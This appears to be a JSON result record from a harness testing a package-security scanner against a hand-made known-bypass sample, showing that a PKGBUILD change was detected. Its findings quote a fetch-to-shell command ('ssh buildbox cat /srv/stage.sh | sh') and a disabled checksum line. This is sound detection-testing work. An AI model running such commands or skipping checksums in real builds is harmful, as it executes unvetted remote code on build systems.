@@ -1,0 +1,189 @@
+{
+  "attempt": 1,
+  "cost": {},
+  "db_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+  "diff_sha256": "sha256:ccb031e59e6e9b60f0014ca9a78914670cb169b249c4b64e9841aeff5935514c",
+  "generator": {
+    "directory": "campaigns/known-bypasses-manual/manual",
+    "inputs": 8,
+    "type": "manual"
+  },
+  "judge": {
+    "catching_rules": [],
+    "coverage_gaps": [],
+    "fatal": false,
+    "rationale": "score 65 > threshold 20",
+    "verdict": "detected"
+  },
+  "stages": {
+    "_text_source": "generator",
+    "behavior": {
+      "chain": "ssh -> pipe -> shell",
+      "preserved": true,
+      "reason": "",
+      "validator_version": "sha256:1cf585b73235c107a8ce4c9757d7ad27636bed9d18eda3a4d33f074001b0b198"
+    },
+    "constraints": {
+      "honored": true,
+      "violated": []
+    },
+    "sanitization": {
+      "passed": true,
+      "reason": ""
+    },
+    "syntax": {
+      "bash_n_new": 0,
+      "bash_n_old": 0,
+      "reason": ""
+    }
+  },
+  "status": "detected",
+  "trustsight": {
+    "config_fingerprint": "sha256:674ed4b8bef677140dfac9d70671a3dea5221fb93c0d3f35cf17036c55baccb1",
+    "report": {
+      "changes": [
+        "checksums changed from sha256 to SKIP"
+      ],
+      "config_fingerprint": "sha256:674ed4b8bef677140dfac9d70671a3dea5221fb93c0d3f35cf17036c55baccb1",
+      "coverage_gaps": [
+        "tree_not_analyzed"
+      ],
+      "dependencies": [],
+      "depth_truncated": false,
+      "diff_truncated": false,
+      "failed": false,
+      "file_changes": [],
+      "findings": [
+        {
+          "description": "checksum set to SKIP [R004]",
+          "evidence": {
+            "match": "sha256sums=SKIP",
+            "skip_suffix": ""
+          },
+          "file": "PKGBUILD",
+          "line": 14,
+          "rule_id": "R004",
+          "severity": "HIGH",
+          "template": "checksum set to SKIP{skip_suffix}"
+        },
+        {
+          "description": "Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | sh [X009]",
+          "evidence": {
+            "body": "ssh buildbox cat /srv/stage.sh | sh",
+            "match": "uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | sh",
+            "shape": "uncatalogued fetch to a shell"
+          },
+          "file": "PKGBUILD",
+          "line": 19,
+          "rule_id": "X009",
+          "severity": "CRITICAL",
+          "template": "Fetch Through An Uncatalogued Client: {match}"
+        }
+      ],
+      "first_seen": false,
+      "flagged": true,
+      "fully_vetted": false,
+      "ioc_matches": [],
+      "is_trivial": true,
+      "new_commit": "",
+      "new_version": "1.0.0",
+      "old_commit": "",
+      "old_version": "1.0.0",
+      "package": "harness-pkg",
+      "required_by": [],
+      "review_profile": "default",
+      "review_threshold": 20,
+      "risk": "High",
+      "risk_label": "High (incomplete analysis)",
+      "scan_truncated": false,
+      "score": 65,
+      "score_breakdown": [
+        {
+          "evidence": {
+            "match": "sha256sums=SKIP",
+            "skip_suffix": ""
+          },
+          "file": "PKGBUILD",
+          "line": 14,
+          "params": {
+            "skip_suffix": ""
+          },
+          "reason": "Checksum Disabled: sha256sums=SKIP",
+          "rule_id": "R004",
+          "severity": "HIGH",
+          "template": "checksum set to SKIP{skip_suffix}",
+          "weight": 25
+        },
+        {
+          "evidence": {
+            "body": "ssh buildbox cat /srv/stage.sh | sh",
+            "match": "uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | sh",
+            "shape": "uncatalogued fetch to a shell"
+          },
+          "file": "PKGBUILD",
+          "line": 19,
+          "params": {
+            "body": "ssh buildbox cat /srv/stage.sh | sh",
+            "shape": "uncatalogued fetch to a shell"
+          },
+          "reason": "Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | sh",
+          "rule_id": "X009",
+          "severity": "CRITICAL",
+          "template": "Fetch Through An Uncatalogued Client: {match}",
+          "weight": 40
+        },
+        {
+          "evidence": {
+            "match": "diff modifies build()",
+            "touched": "build"
+          },
+          "file": "PKGBUILD",
+          "line": null,
+          "params": {
+            "touched": "build"
+          },
+          "reason": "Critical Build Function Modified: diff modifies build()",
+          "rule_id": "R060",
+          "severity": "INFO",
+          "template": "critical build function modified: {touched}",
+          "weight": 0
+        },
+        {
+          "evidence": {
+            "match": "rule hits span 3 distinct capability categories",
+            "n_categories": 3
+          },
+          "file": "",
+          "line": null,
+          "params": {
+            "n_categories": 3
+          },
+          "reason": "Capability Density Anomaly: rule hits span 3 distinct capability categories",
+          "rule_id": "R072",
+          "severity": "INFO",
+          "template": "findings span {n_categories} distinct capability categories",
+          "weight": 0
+        },
+        {
+          "evidence": {
+            "gap": "tree_not_analyzed"
+          },
+          "file": "",
+          "line": null,
+          "params": {
+            "gap": "tree_not_analyzed"
+          },
+          "reason": "Coverage gap: the repository file manifest was unavailable, so only the PKGBUILD was examined",
+          "rule_id": "COVERAGE",
+          "severity": "INFO",
+          "template": "",
+          "weight": 0
+        }
+      ],
+      "suppressed_rules": [],
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. no structural changes. Signals: Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | sh [X009]; checksum set to SKIP [R004]. Review the diff before building.",
+      "version_comparison": ""
+    },
+    "wall_clock_ms": 753
+  }
+}
